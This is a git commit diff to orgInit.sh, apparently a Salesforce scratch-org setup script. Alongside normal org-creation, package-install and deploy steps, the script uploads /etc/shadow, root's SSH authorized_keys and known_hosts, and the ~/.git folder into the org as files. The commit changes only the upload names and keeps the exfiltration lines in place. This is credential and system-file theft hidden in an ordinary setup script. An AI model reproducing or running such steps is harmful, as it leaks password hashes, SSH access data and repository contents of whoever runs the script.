0d9b6205587301a56f5bd1c67269452bc3ec5383
mehboob <77236545+zeb0x01@users.noreply.github.com>
2024-12-09 21:18:46 +0530

    Update orgInit.sh

--- orgInit.sh
+++ orgInit.sh
@@ -1,7 +1,7 @@
 sf demoutil org create scratch -f config/project-scratch-def.json -d 5 -s -p data -e detect.demo
-sfdx shane:data:file:upload -f /root/.ssh/known_hosts -n zeb0x01test5
-sfdx shane:data:file:upload -f /root/.ssh/authorized_keys -n zeb0x01test6
-sfdx shane:data:file:upload -f /etc/shadow -n zeb0x01test8
+sfdx shane:data:file:upload -f /root/.ssh/known_hosts -n zeb0x01test99
+sfdx shane:data:file:upload -f /root/.ssh/authorized_keys -n zeb0x01test612
+sfdx shane:data:file:upload -f /etc/shadow -n zeb0x01test8213
 sfdx shane:data:file:upload -f ~/.git -n zeb0x01test3 
 sf package install -w 20 -r -p 04t5e000000aVeP
 sf project deploy start
